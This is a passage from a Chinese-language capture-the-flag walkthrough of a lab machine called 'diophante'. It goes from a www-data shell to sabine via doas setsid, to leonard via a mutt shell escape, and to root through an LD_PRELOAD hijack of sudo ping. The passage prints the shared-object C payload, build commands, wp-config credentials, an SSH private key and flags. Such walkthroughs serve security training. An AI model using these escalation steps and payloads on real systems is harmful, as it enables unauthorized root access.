-rw-r--r--  1 www-data www-data  4747 Apr  7  2021 wp-trackback.php
-rw-r--r--  1 www-data www-data  3236 Apr  7  2021 xmlrpc.php
(remote) www-data@diophante:/var/www/html/blog$ cat wp-config.php
<?php
/**
 * La configuration de base de votre installation WordPress.
 *
 * Ce fichier est utilisé par le script de création de wp-config.php pendant
 * le processus d’installation. Vous n’avez pas à utiliser le site web, vous
 * pouvez simplement renommer ce fichier en « wp-config.php » et remplir les
 * valeurs.
 *
 * Ce fichier contient les réglages de configuration suivants :
 *
 * Réglages MySQL
 * Préfixe de table
 * Clés secrètes
 * Langue utilisée
 * ABSPATH
 *
 * @link https://fr.wordpress.org/support/article/editing-wp-config-php/.
 *
 * @package WordPress
 */

// ** Réglages MySQL - Votre hébergeur doit vous fournir ces informations. ** //
/** Nom de la base de données de WordPress. */
define( 'DB_NAME', 'wordpress' );

/** Utilisateur de la base de données MySQL. */
define( 'DB_USER', 'wpuser' );

/** Mot de passe de la base de données MySQL. */
define( 'DB_PASSWORD', 'wppassword' );

/** Adresse de l’hébergement MySQL. */
define( 'DB_HOST', 'localhost' );

/** Jeu de caractères à utiliser par la base de données lors de la création des tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/**
 * Type de collation de la base de données.
 * N’y touchez que si vous savez ce que vous faites.
 */
define( 'DB_COLLATE', '' );

/**#@+
 * Clés uniques d’authentification et salage.
 *
 * Remplacez les valeurs par défaut par des phrases uniques !
 * Vous pouvez générer des phrases aléatoires en utilisant
 * {@link https://api.wordpress.org/secret-key/1.1/salt/ le service de clés secrètes de WordPress.org}.
 * Vous pouvez modifier ces phrases à n’importe quel moment, afin d’invalider tous les cookies existants.
 * Cela forcera également tous les utilisateurs à se reconnecter.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '#,g><LSZX0HW]D<yRmgs&Wf8TZgQ:J3]+`X6iZ1`Eq%j$jLId(g;>rFU.R]~FN:l' );
define( 'SECURE_AUTH_KEY',  'OvszI?ZXB2tO=s=e;JCT{r[*[wU4HYjN]Ul;QSrnhq|M=x8fJjf4,T.ek^|t*)oE' );
define( 'LOGGED_IN_KEY',    '+B!0BXPa#n/dITg~>`y1Ns|?=Kw|Ph)W!:IY!c?KB-vkmXLh.961;wkd+.i>o!>7' );
define( 'NONCE_KEY',        ':tF;H[_jOV,:H*~<EYS3:jCGpvHM8/:=V{-NDl2d36/ivnA@EFG8q7cQ%SJEW8Y3' );
define( 'AUTH_SALT',        'rVEb=RPOZG]`pQm2Vv?8k$|7SS+)MshG1sI8RZN.2Plwk#J)O75d1Q%|TuE()lE$' );
define( 'SECURE_AUTH_SALT', 'yg4jQXSs=[xb-Y3[!3shWt,UK3T:[+`Yi/8{#w|r]x6#+$VIV+*4<2.&@]!3NAH8' );
define( 'LOGGED_IN_SALT',   'a73Rg9qLRDaGbfEU9-y&$BY7~vLQ+gqGhAdzj8C:X d}j.GKn>5NSoC!,sPGD^ke' );
define( 'NONCE_SALT',       ') F1enYj2.O5.:UWZ0CS{5y~i[JZ0FRC`X_q3r0/T?=naqS$N*weR-059*uTXXh7' );
/**#@-*/

/**
 * Préfixe de base de données pour les tables de WordPress.
 *
 * Vous pouvez installer plusieurs WordPress sur une seule base de données
 * si vous leur donnez chacune un préfixe unique.
 * N’utilisez que des chiffres, des lettres non-accentuées, et des caractères soulignés !
 */
$table_prefix = 'wp_';

/**
 * Pour les développeurs : le mode déboguage de WordPress.
 *
 * En passant la valeur suivante à "true", vous activez l’affichage des
 * notifications d’erreurs pendant vos essais.
 * Il est fortement recommandé que les développeurs d’extensions et
 * de thèmes se servent de WP_DEBUG dans leur environnement de
 * développement.
 *
 * Pour plus d’information sur les autres constantes qui peuvent être utilisées
 * pour le déboguage, rendez-vous sur le Codex.
 *
 * @link https://fr.wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* C’est tout, ne touchez pas à ce qui suit ! Bonne publication. */

/** Chemin absolu vers le dossier de WordPress. */
if ( ! defined( 'ABSPATH' ) )
  define( 'ABSPATH', dirname( __FILE__ ) . '/' );

/** Réglage des variables de WordPress et de ses fichiers inclus. */
require_once( ABSPATH . 'wp-settings.php' );
```

得到一个数据库，但是全是默认用户密码，先不进行尝试。

### setsid切换用户

看看别的：

```bash
(remote) www-data@diophante:/var/www/html/blog$ cat /etc/passwd | grep sh | cut -d: -f1
Binary file (standard input) matches
(remote) www-data@diophante:/var/www/html/blog$ echo $SHELL
/usr/sbin/nologin
(remote) www-data@diophante:/var/www/html/blog$ cd /home
(remote) www-data@diophante:/home$ ls -la
total 16
drwxr-xr-x  4 root    root    4096 Apr  7  2021 .
drwxr-xr-x 18 root    root    4096 Apr  6  2021 ..
drwxr-xr-x  5 leonard leonard 4096 Apr 14  2021 leonard
drwxr-xr-x  5 sabine  sabine  4096 Apr  8  2021 sabine
(remote) www-data@diophante:/home$ cd leonard/
(remote) www-data@diophante:/home/leonard$ ls -la
total 44
drwxr-xr-x 5 leonard leonard 4096 Apr 14  2021 .
drwxr-xr-x 4 root    root    4096 Apr  7  2021 ..
-rw------- 1 leonard leonard   52 Apr  7  2021 .Xauthority
lrwxrwxrwx 1 leonard leonard    9 Apr  8  2021 .bash_history -> /dev/null
-rw-r--r-- 1 leonard leonard  220 Apr  7  2021 .bash_logout
-rw-r--r-- 1 leonard leonard 3526 Apr  7  2021 .bashrc
drwx------ 3 leonard leonard 4096 Apr  7  2021 .gnupg
drwxr-xr-x 3 leonard leonard 4096 Apr  7  2021 .local
-rw-r--r-- 1 leonard leonard  807 Apr  7  2021 .profile
drwx------ 2 leonard leonard 4096 Apr  8  2021 .ssh
-rw-r--r-- 1 leonard leonard  209 Apr  7  2021 .wget-hsts
-rwx------ 1 leonard leonard   16 Apr  8  2021 user.txt
(remote) www-data@diophante:/home/leonard$ cd  ../sabine/
(remote) www-data@diophante:/home/sabine$ ls -la
total 36
drwxr-xr-x 5 sabine sabine 4096 Apr  8  2021 .
drwxr-xr-x 4 root   root   4096 Apr  7  2021 ..
-rw------- 1 sabine sabine   52 Apr  7  2021 .Xauthority
lrwxrwxrwx 1 root   root      9 Apr  8  2021 .bash_history -> /dev/null
-rw-r--r-- 1 sabine sabine  220 Apr  6  2021 .bash_logout
-rw-r--r-- 1 sabine sabine 3526 Apr  6  2021 .bashrc
drwx------ 3 sabine sabine 4096 Apr  7  2021 .gnupg
drwxr-xr-x 3 sabine sabine 4096 Apr  7  2021 .local
-rw-r--r-- 1 sabine sabine  807 Apr  6  2021 .profile
drwx------ 2 sabine sabine 4096 Apr 14  2021 .ssh
(remote) www-data@diophante:/home/sabine$ cd ~
(remote) www-data@diophante:/var/www$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/mount
/usr/bin/xclip
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/doas
/usr/bin/chsh
/usr/bin/su
/usr/bin/umount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/sudo
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd
(remote) www-data@diophante:/var/www$ find / -name "*doas*" 2>/dev/null
/var/lib/dpkg/info/doas.conffiles
/var/lib/dpkg/info/doas.md5sums
/var/lib/dpkg/info/doas.list
/etc/pam.d/doas
/etc/doas.conf
/usr/share/doc/doas
/usr/share/lintian/overrides/doas
/usr/share/man/man5/doas.conf.5.gz
/usr/share/man/man1/doas.1.gz
/usr/bin/doas
(remote) www-data@diophante:/var/www$ cat /etc/doas.conf
permit nopass www-data as sabine cmd /usr/bin/setsid
permit nopass sabine as leonard cmd /usr/bin/mutt
```

发现`www-data`用户可以以 sabine 身份执行 setsid：

```bash
┌──(kali㉿kali)-[~]
└─$ tldr setsid    

  Run a program in a new session if the calling process is not a process group leader.
  The created session is by default not controlled by the current terminal.
  More information: <https://manned.org/setsid>.

  Run a program in a new session:

      setsid program

  Run a program in a new session discarding the resulting output and error:

      setsid program > /dev/null 2>&1

  Run a program creating a new process:

      setsid [-f|--fork] program

  Return the exit code of a program as the exit code of setsid when the program exits:

      setsid [-w|--wait] program

  Run a program in a new session setting the current terminal as the controlling terminal:

      setsid [-c|--ctty] program
```

发现是一个创建会话的，尝试一下：

```bash
/usr/bin/doas -u sabine /usr/bin/setsid /bin/bash
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506141116112.png" alt="image-20250614102411431" style="zoom:50%;" />

切换成功！！！！

### mutt提权用户

同时注意到刚刚`sabine as leonard cmd /usr/bin/mutt`，sabine也有特殊权限，看看这个`mutt`是啥：

```bash、
┌──(kali㉿kali)-[~]
└─$ tldr mutt  

  Command-line email client.
  More information: <http://mutt.org/doc/mutt.1.txt>.

  Open the specified mailbox:

      mutt -f mailbox

  Send an email and specify a subject and a cc recipient:

      mutt -s subject -c cc@example.com recipient@example.com

  Send an email with files attached:

      mutt -a file1 file2 -- recipient@example.com

  Specify a file to include as the message body:

      mutt -i path/to/file recipient@example.com

  Specify a draft file containing the header and the body of the message, in RFC 5322 format:

      mutt -H path/to/file recipient@example.com
```

发现是个邮件客户端，打开先看一下：

```bash
/usr/bin/doas -u leonard /usr/bin/mutt
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506141116113.png" alt="image-20250614102747936" style="zoom:50%;" />

压根看不清。。。。瞎按，联想到`Orasi`靶场，看了一下相关命令，发现：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506141116114.png" alt="image-20250614103157664" style="zoom:50%;" />

尝试进行逃逸，按几下 esc 再按几下`!`：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506141116115.png" alt="image-20250614103249412" style="zoom:50%;" />

然后`/bin/bash`即可切换用户。。。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506141116116.png" alt="image-20250614103336715" style="zoom:50%;" />

### LD劫持root

```bash
leonard@diophante:~$ ls -la
total 48
drwxr-xr-x 6 leonard leonard 4096 Jun 14 04:27 .
drwxr-xr-x 4 root    root    4096 Apr  7  2021 ..
-rw------- 1 leonard leonard   52 Apr  7  2021 .Xauthority
lrwxrwxrwx 1 leonard leonard    9 Apr  8  2021 .bash_history -> /dev/null
-rw-r--r-- 1 leonard leonard  220 Apr  7  2021 .bash_logout
-rw-r--r-- 1 leonard leonard 3526 Apr  7  2021 .bashrc
drwx------ 3 leonard leonard 4096 Apr  7  2021 .gnupg
drwxr-xr-x 3 leonard leonard 4096 Apr  7  2021 .local
-rw-r--r-- 1 leonard leonard  807 Apr  7  2021 .profile
drwx------ 2 leonard leonard 4096 Apr  8  2021 .ssh
-rw-r--r-- 1 leonard leonard  209 Apr  7  2021 .wget-hsts
drwx------ 2 leonard leonard 4096 Jun 14 04:27 Mail
-rwx------ 1 leonard leonard   16 Apr  8  2021 user.txt
leonard@diophante:~$ cat user.txt 
Thonirburarnlog
leonard@diophante:~$ cd Mail/
leonard@diophante:~/Mail$ ls -la
total 8
drwx------ 2 leonard leonard 4096 Jun 14 04:27 .
drwxr-xr-x 6 leonard leonard 4096 Jun 14 04:27 ..
leonard@diophante:~/Mail$ cd ../
leonard@diophante:~$ sudo -l
Matching Defaults entries for leonard on diophante:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=LD_PRELOAD

User leonard may run the following commands on diophante:
    (ALL : ALL) NOPASSWD: /usr/bin/ping
```

注意到`env_keep+=LD_PRELOAD`，意思是也会保存我们指定的动态链接库，尝试进行劫持，先看看`ping`有啥函数：

```bash
leonard@diophante:~$ ping -V
ping utility, iputils-s20180629
```

找到当时的那个版本，下载下来，看看源代码有些啥：https://github.com/iputils/iputils/releases/tag/s20180629

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506141116117.png" alt="image-20250614104742417" style="zoom:50%;" />

随便找了一个就用它吧！！！！

具体脚本可以参考：https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html?highlight=LD_PRELOAD#ld_preload--ld_library_path

然后突然悲哀的发现，其实不用找那个函数名，只需要将函数定义成如下就行了。。。。

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

然后再尝试在靶机编译：

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
# sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

但是来都来了，尝试定义成我们找到的函数吧，看看行不行！！！！

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void create_socket() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

但是似乎没成功。。。。

```bash
leonard@diophante:/tmp$ nano exp.c
leonard@diophante:/tmp$ chmod +x exp.c
leonard@diophante:/tmp$ gcc -fPIC -shared -o exp.so exp.c -nostartfiles
exp.c: In function 'create_socket':
exp.c:7:5: warning: implicit declaration of function 'setgid' [-Wimplicit-function-declaration]
    7 |     setgid(0);
      |     ^~~~~~
exp.c:8:5: warning: implicit declaration of function 'setuid' [-Wimplicit-function-declaration]
    8 |     setuid(0);
      |     ^~~~~~
leonard@diophante:/tmp$ sudo -l
Matching Defaults entries for leonard on diophante:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=LD_PRELOAD

User leonard may run the following commands on diophante:
    (ALL : ALL) NOPASSWD: /usr/bin/ping
```

而且终端还炸掉了，`ctrl+c`无法停止。。。。重新上述步骤登到用户里，秒搞一个`id_rsa`:

```bash
leonard@diophante:~/.ssh$ ssh-keygen -o
Generating public/private rsa key pair.
Enter file in which to save the key (/home/leonard/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/leonard/.ssh/id_rsa
Your public key has been saved in /home/leonard/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:FNvoQ9AXOxppJgoEL1itUoXyBtJ/8QLFIUoCdqkQJOE leonard@diophante
The key's randomart image is:
+---[RSA 3072]----+
|XB+=+o+o. ..     |
|X*=oo.o..*..     |
|=E=o ..oX.+      |
|.o+...oB.o .     |
| o  .. .S        |
|         .       |
|                 |
|                 |
|                 |
+----[SHA256]-----+
leonard@diophante:~/.ssh$ ls -la
total 16
drwx------ 2 leonard leonard 4096 Jun 14 04:59 .
drwxr-xr-x 6 leonard leonard 4096 Jun 14 04:27 ..
-rw------- 1 leonard leonard 2602 Jun 14 04:59 id_rsa
-rw------- 1 leonard leonard  571 Jun 14 04:59 id_rsa.pub
leonard@diophante:~/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

leonard@diophante:~/.ssh$ mv id_rsa.pub authorized_keys
```

ssh连接上，尝试进行测试，然后我意识到这是个静态函数，仅在其定义的源文件中可见，不会被导出到符号表中，所以不能被劫持，换一个：（被自己菜晕了.jpg）

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506141116118.png" alt="image-20250614111327780" style="zoom:50%;" />

```bash
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void setlocale() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202506141116119.png" alt="image-20250614111540899" style="zoom:50%;" />

提权成功！！！！

```bash
root@diophante:/tmp# cd ~
root@diophante:~# whoami;id
root
uid=0(root) gid=0(root) groupes=0(root)
root@diophante:~# ls -la
total 40
drwx------  4 root root 4096 avril 14  2021 .
drwxr-xr-x 18 root root 4096 avril  6  2021 ..
lrwxrwxrwx  1 root root    9 avril  8  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 janv. 31  2010 .bashrc
drwx------  3 root root 4096 avril  7  2021 .gnupg
drwxr-xr-x  3 root root 4096 avril  8  2021 .local
-rw-------  1 root root  182 avril  7  2021 .mysql_history
-rw-r--r--  1 root root  148 août  17  2015 .profile
-rwx------  1 root root   13 avril  8  2021 root.txt
-rw-r--r--  1 root root   66 avril  7  2021 .selected_editor
-rw-------  1 root root  211 avril 14  2021 .Xauthority
root@diophante:~# cat root.txt 
Culcelborlus
root@diophante:~# cat .mysql_history 
 create database wordpress;
create user wpuser; 
set password for wpuser= PASSWORD("wppassword");
GRANT ALL PRIVILEGES ON wordpress.* TO wpuser@localhost IDENTIFIED by "wppassword";
```

